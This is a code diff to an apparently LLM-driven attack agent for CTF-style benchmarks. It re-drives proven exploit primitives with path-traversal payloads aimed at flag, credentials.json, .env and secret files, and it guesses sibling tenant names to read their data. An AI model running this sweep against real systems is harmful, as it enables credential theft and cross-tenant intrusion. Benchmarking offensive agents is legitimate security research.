@@ -61,6 +61,7 @@ from darwin.tools.mcp_client import MCPClientPool, load_mcp_config
 from darwin.tools.mcp_gateway import ToolResult
 from darwin.tools.recon_server import create_recon_gateway, parse_response
 from darwin.tools.attack_server import create_attack_gateway
+from darwin.response_evidence import disclosed_subjects, extract_target_response
 from darwin.utils.http_client import HTTPClient, ProbeClient, HTTPResponse
 from darwin.utils.llm import LLMSession
 from darwin.utils.phase_logger import PhaseLogger
@@ -1033,6 +1034,9 @@ class LifecycleCoordinator(CoordinatorContext):
         Uses LLM to suggest smart flag paths based on the technology stack
         and discovered endpoints, then probes them all.
         """
+        primitives = await self._sweep_exploit_primitives()
+        if primitives is not None:
+            return primitives
         import urllib.parse as _up3
         urls_to_check: list[str] = []
 
@@ -1107,6 +1111,122 @@ class LifecycleCoordinator(CoordinatorContext):
                         )
                 except Exception:
                     continue
+        return None
+
+    #: Generic flag-bearing file names, and generic adjacent-subject names.
+    _FLAG_FILES = (
+        "flag", "flag.txt", "secret", "secret.txt", "secret.key",
+        "credentials", "credentials.json", "config.json", ".env",
+    )
+    _SUBJECT_FLAG_FILES = ("flag", "flag.txt", "secret.txt", ".env")
+    _ROLE_SUBJECTS = ("default", "admin", "victim", "other", "shared", "public")
+
+    def _subject_candidates(self, limit: int = 8) -> list[str]:
+        """Subjects worth trying next to the ones this run has already seen.
+
+        A multi-tenant target that answered for ``tenant-a`` has a sibling;
+        enumerating the adjacent identifier is the standard next step after a
+        traversal is proven, and it never assumes a benchmark's name.
+        """
+        blobs = [
+            str(value) for value in
+            list(getattr(self, "_request_values_seen", set()))
+            + list(getattr(self, "_benign_subjects", set()))
+        ]
+        try:
+            blobs += [
+                str(ep.get("sample_response", "") or "")
+                for ep in self.dkg.query_nodes("Endpoint")
+            ]
+            blobs += [
+                str(prim.get("evidence", "") or "")
+                for prim in self.dkg.query_nodes("ExploitPrimitive")
+            ]
+        except Exception as exc:
+            log.debug("subject scan skipped: %s", exc)
+        observed: list[str] = []
+        for blob in blobs:
+            for token in disclosed_subjects(blob):
+                if token not in observed:
+                    observed.append(token)
+        derived: list[str] = []
+        for token in observed:
+            prefix, separator, tail = (
+                token.rpartition("-") if "-" in token else token.rpartition("_")
+            )
+            if prefix and len(tail) == 1 and tail.isalnum():
+                for follower in "bcdef":
+                    derived.append(f"{prefix}{separator}{follower}")
+                if tail.isalpha():
+                    base = ord(tail.lower())
+                    derived.append(f"{prefix}{separator}{chr(base + 1)}")
+        ordered = observed + derived + list(self._ROLE_SUBJECTS)
+        return list(dict.fromkeys(ordered))[:limit]
+
+    def _flag_payload_candidates(self) -> list[str]:
+        """Payloads that a proven primitive can be re-driven with."""
+        candidates: list[str] = []
+        for name in self._FLAG_FILES:
+            candidates.extend([f"/{name}", f"../{name}", f"../../{name}"])
+        for subject in self._subject_candidates():
+            for name in self._SUBJECT_FLAG_FILES:
+                candidates.append(f"../{subject}/{name}")
+        return list(dict.fromkeys(candidates))
+
+    async def _sweep_exploit_primitives(self) -> TaskResult | None:
+        """Re-drive proven primitives against flag-bearing targets.
+
+        The generic sweep below only issues credential-less GETs; a primitive
+        proven through a JSON POST (or any other shape) is unreachable from
+        there, which is exactly how cloud-29 finished with a proven arbitrary
+        file read and no flag.
+        """
+        from darwin.tools.request_template import RequestTemplate
+
+        try:
+            primitives = self.dkg.query_nodes("ExploitPrimitive")
+        except Exception as exc:
+            log.debug("primitive lookup failed: %s", exc)
+            return None
+        if not primitives:
+            return None
+        payloads = self._flag_payload_candidates()
+        for primitive in primitives[:4]:
+            template = RequestTemplate.from_dict(primitive.get("request"))
+            if template is None or template.inject is None:
+                continue
+            tool = str(primitive.get("tool") or "send_payload")
+            for payload in payloads:
+                if self._remaining_budget() <= 0:
+                    return None
+                params = template.render(payload).tool_params(tool)
+                if not params:
+                    continue
+                try:
+                    result = await self._call_tool(tool, params)
+                except Exception as exc:
+                    log.debug("primitive replay failed: %s", exc)
+                    continue
+                text = extract_target_response(
+                    tool, str(getattr(result, "stdout", "") or ""),
+                    getattr(result, "parsed_output", {}) or {},
+                ) or str(getattr(result, "stdout", "") or "")
+                for flag in self.flag_pattern.findall(text):
+                    is_valid, reason = await self._verify_flag(
+                        flag, text, params, 0, tool,
+                    )
+                    if is_valid:
+                        self._task_log_event(
+                            "info", "flag_found_primitive",
+                            url=template.url, payload=payload, flag=flag,
+                        )
+                        self.phase = OrchestratorPhase.DONE
+                        return TaskResult(
+                            success=True, flag=flag, steps=self.step_count,
+                            tokens_used=self._tokens_used(),
+                            time_elapsed=time.time() - self.start_time,
+                        )
+                    log.debug("primitive flag rejected: %s", reason)
         return None
 
     def _print_plan_status(self) -> None:
